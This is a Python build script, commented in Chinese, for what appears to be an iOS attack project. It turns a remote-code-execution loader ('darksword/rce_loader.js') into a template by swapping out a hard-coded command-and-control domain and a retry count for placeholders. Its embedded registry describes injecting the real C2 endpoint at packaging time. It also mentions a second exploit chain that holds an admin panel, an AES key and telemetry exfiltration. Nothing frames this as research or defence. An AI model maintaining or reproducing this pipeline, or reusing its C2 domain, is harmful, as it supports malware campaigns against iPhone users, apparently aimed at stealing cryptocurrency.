# -*- coding: utf-8 -*-
"""
W1-C1b：从 【只读载荷本体】 派生【模板层】。

★ 只读源件，绝不改写 05-ios/** 既有文件。
★ 只把【两个目标值】替换为占位符，其余逐字节保持一致（保住 J6「仅占位符处不同」）。
  1) C2 域名  https://sqwas.ebwlyais.xyz  ->  __C2_ENDPOINT__
  2) RCE_MAX_ATTEMPTS = 20                ->  __RCE_MAX_ATTEMPTS__

用法：python make_templates.py
"""
from __future__ import annotations

import hashlib
import os

ROOT = r"E:\USDT项目"
SRC_LOADER = os.path.join(ROOT, "05-ios", "darksword", "rce_loader.js")
TPL_DIR = os.path.join(ROOT, "05-ios", "_templates")

# ★ 真值登记（仅用于【派生模板时的替换】，不写入产物、不硬编码进 build 脚本）
C2_VALUE = "https://sqwas.ebwlyais.xyz"
C2_PH = "__C2_ENDPOINT__"
ATTEMPTS_VALUE = "var RCE_MAX_ATTEMPTS = 20;"
ATTEMPTS_PH = "var RCE_MAX_ATTEMPTS = __RCE_MAX_ATTEMPTS__;"


def sha256(p):
    h = hashlib.sha256()
    with open(p, "rb") as f:
        for c in iter(lambda: f.read(1 << 20), b""):
            h.update(c)
    return h.hexdigest()


def derive_loader() -> str:
    """读只读载荷 → 返回含占位符的模板文本。"""
    with open(SRC_LOADER, "rb") as f:
        raw = f.read()
    src_sha = hashlib.sha256(raw).hexdigest()
    text = raw.decode("utf-8")

    n_c2 = text.count(C2_VALUE)
    assert n_c2 > 0, "未在载荷中找到 C2 真值 —— 卡描述与实际不符，停下报告"
    text = text.replace(C2_VALUE, C2_PH)

    n_att = text.count(ATTEMPTS_VALUE)
    assert n_att == 1, f"RCE_MAX_ATTEMPTS 行应恰好 1 处，实测 {n_att} —— 停下报告"
    text = text.replace(ATTEMPTS_VALUE, ATTEMPTS_PH)

    # 只允许这两处变化：把占位符换回真值后必须与原载荷逐字节一致
    back = text.replace(C2_PH, C2_VALUE).replace(ATTEMPTS_PH, ATTEMPTS_VALUE)
    assert back == raw.decode("utf-8"), "模板派生引入了占位符之外的改动 —— 停下报告"

    print(f"  源载荷 sha256 : {src_sha}")
    print(f"  C2 域名替换   : {n_c2} 处 -> {C2_PH}")
    print(f"  重试次数替换  : {n_att} 处 -> {ATTEMPTS_PH}")
    print(f"  往返一致性    : OK（仅占位符处不同）")
    return text


def main():
    os.makedirs(os.path.join(TPL_DIR, "darksword"), exist_ok=True)
    # ★ `coruna/` 保留为**有意留空**的骨架（裁定⑨，2026-10-03）：
    #   coruna 链无只读真值可脱敏（详见 TEMPLATE_REGISTRY 的说明）。
    #   选择**保留 makedirs**而非删除：① 最小改动；② 保留与 darksword/ 的结构对称；
    #   ③ 删除会让该目录在全新检出时不存在，属行为变更。空目录的含义见 PLACEHOLDERS.md。
    os.makedirs(os.path.join(TPL_DIR, "coruna"), exist_ok=True)

    tpl_text = derive_loader()

    # ---- 模板 1：darksword/rce_loader.template.js（含两个占位符）----
    out1 = os.path.join(TPL_DIR, "darksword", "rce_loader.template.js")
    with open(out1, "wb") as f:
        f.write(tpl_text.encode("utf-8"))
    print(f"  [写入] {out1}")
    print(f"         sha256={sha256(out1)}")

    # ---- 占位符登记表（机制文档，非产物）----
    reg = os.path.join(TPL_DIR, "PLACEHOLDERS.md")
    with open(reg, "w", encoding="utf-8", newline="\n") as f:
        f.write(TEMPLATE_REGISTRY)
    print(f"  [写入] {reg}")
    print(f"         sha256={sha256(reg)}")


TEMPLATE_REGISTRY = """# 模板层占位符登记表（W1-C1b）

★ 本目录 `05-ios/_templates/` 是【模板层】，与 `05-ios/{coruna,darksword}/`（载荷本体，只读）
  **物理隔离**。打包期由 `build_unified.ps1` 的 `Invoke-TemplateInjection` 注入真值后写出产物。

## 方向说明

| 方向 | 机制 | 位置 |
|---|---|---|
| **脱敏**（既有） | 真值 → 占位符 | `build_unified.ps1` 的 `$SANITIZE_LEGACY_REPLACEMENTS` |
| **注入**（本卡） | 占位符 → 真值 | `build_unified.ps1` 的 `Invoke-TemplateInjection` |

两者方向相反、机制相同（同一张"值 ↔ 占位符"映射表），互为逆运算。

## 首批占位符

| 占位符 | 语义 | 真值来源（环境变量） | 承接卡 | 必填 |
|---|---|---|---|---|
| `__C2_ENDPOINT__` | C2 域名（含 scheme） | `W1C1B_C2_ENDPOINT` | D0-C7 | 是 |
| `__RCE_MAX_ATTEMPTS__` | RCE 重试次数 | `W1C1B_RCE_MAX_ATTEMPTS` | S2 | 是 |

★ 真值一律从**环境变量**读取，**绝不硬编码进脚本**（否则即为新的明文泄漏）。
★ 占位符未被替换（真值缺失）⇒ **报错退出**，绝不静默产出含占位符的产物。

## 承接卡待补

| # | 占位符 | 承接卡 | 状态 |
|---|---|---|---|
| 1 | `__C2_ENDPOINT__` | D0-C7 | 语义已定，值由 D0-C7 填 |
| 2 | `__RCE_MAX_ATTEMPTS__` | S2 | 语义已定，值由 S2 填 |
| 3 | （S1 的 404 竞态） | S1 | ★ 待定位 |
| 4 | （S3 的入口 9 步合并） | S3 | ★ 待定位 |

## 模板清单

| 模板 | 派生自 | 含占位符 |
|---|---|---|
| `darksword/rce_loader.template.js` | `05-ios/darksword/rce_loader.js`（只读） | `__C2_ENDPOINT__`、`__RCE_MAX_ATTEMPTS__` |

★ **`coruna/` 目录为空是【有意】的**（Owner 裁定⑨，⌛2026-10-03）：
  coruna 链**没有只读真值需要脱敏/注入** ⇒ **无派生目标，故无模板**。
  取证：① `group.html` 全文**无 C2 域名字面量**（C2 base 由 `window.location.origin` 运行时派生）；
  ② 交付载荷 `templates/coruna/` 的 15 个 `.js` 除 `w3.org` XML 命名空间外**无 host 真值**；
  ③ coruna 的真值全在**非交付面** —— 管理台路径 `group.html:242`、salt `group.html:466` /
  `chain-coruna.js:230`、`coruna/backend/*.py`（AES key、遥测外联）。
  ★ **不得据此认为 coruna 模板"缺失待补"** —— 见 `W-IOS-GAP-模板层空目录与HOST占位符-取证与处置.md` §1。
"""


if __name__ == "__main__":
    main()
